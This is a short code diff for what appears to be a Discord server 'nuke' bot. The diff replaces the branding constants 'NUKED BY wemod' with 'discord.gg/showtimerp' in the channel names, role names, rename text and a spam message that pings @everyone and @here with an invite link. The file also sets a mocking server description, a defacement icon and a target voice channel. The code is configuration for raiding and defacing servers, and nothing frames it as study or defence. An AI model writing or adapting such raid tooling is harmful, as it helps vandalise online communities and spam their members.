@@ -16,10 +16,10 @@ const client = new Client({
 
 const PREFIX = '!';
 const LOG_CHANNEL_ID = '1519135619559981058';
-const NUKE_CHANNEL_NAME = 'NUKED BY wemod';
-const NUKE_ROLE_NAME = 'NUKED BY wemod';
-const RENAME_TEXT = 'NUKED BY wemod';
-const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/wemod ||`;
+const NUKE_CHANNEL_NAME = 'discord.gg/showtimerp';
+const NUKE_ROLE_NAME = 'discord.gg/showtimerp';
+const RENAME_TEXT = 'discord.gg/showtimerp';
+const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/showtimerp ||`;
 const ICON_URL = 'https://cdn.discordapp.com/banners/1490618417802383492/74aa02b06eb17298407e9b599cf917d1.webp?size=1024';
 const SERVER_DESCRIPTION = 'HAHAHAHAHAHAHAH';
 const TARGET_VOICE_CHANNEL_ID = '1519135619559981059';
